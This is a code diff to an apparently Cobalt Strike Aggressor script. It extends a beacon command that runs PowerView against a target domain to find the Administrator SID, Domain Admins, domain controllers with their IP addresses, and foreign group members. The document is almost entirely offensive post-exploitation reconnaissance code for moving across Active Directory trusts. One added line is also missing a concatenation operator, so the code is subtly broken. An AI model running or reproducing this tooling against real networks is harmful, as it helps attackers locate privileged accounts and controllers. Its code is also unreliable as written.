@@ -1836,18 +1836,25 @@ beacon_command_register(
     "Uses PowerView to check Domain Trusts",
     "Uses PowerView to check Domain Trusts"
 )
-alias trust_gettargets {
+alias trust_getremotetargets {
     local('$handle $script $oneliner');
 
     $size = size(@_);
     if ( $size == 2) {
         $domain = @_[1];
 
-        $command1 = 'Get-DomainGroup -Identity "Domain Admins"'
+        $command1 = 'Convert-NametoSID "Administrator"';
+        
+        $command2 = 'Get-DomainGroup -Identity "Domain Admins"'
         . ' -Domain ' . $domain
         . ' -Properties distinguishedname,ObjectSid';
 
-        $command2 = 'Convert-NametoSID "Administrator"';
+        $command3 = 'Get-DomainController '
+        . ' -Domain ' . $domain
+        . ' | select Forest,Name,IPAddress';
+
+        $command4 = 'Get-DomainForeignGroupMember '
+        . ' -Domain ' $domain;
 
         #import the script
         $handle = openf($POWERVIEW_PATH);
@@ -1857,6 +1864,8 @@ alias trust_gettargets {
         #send script to beacon
         $oneliner1 = beacon_host_script($1, $script);
         $oneliner2 = beacon_host_script($1, $script);
+        $oneliner3 = beacon_host_script($1, $script);
+        $oneliner4 = beacon_host_script($1, $script);
         
     } else {
         berror($1, "Invalid Parameters!");
@@ -1864,6 +1873,9 @@ alias trust_gettargets {
     }
     bpowerpick($1, $command1, $oneliner1);
     bpowerpick($1, $command2, $oneliner2);
+    bpowerpick($1, $command3, $oneliner3);
+    bpowerpick($1, $command4, $oneliner4);
+
 }
 beacon_command_register (
     "trust_getremotetargets",
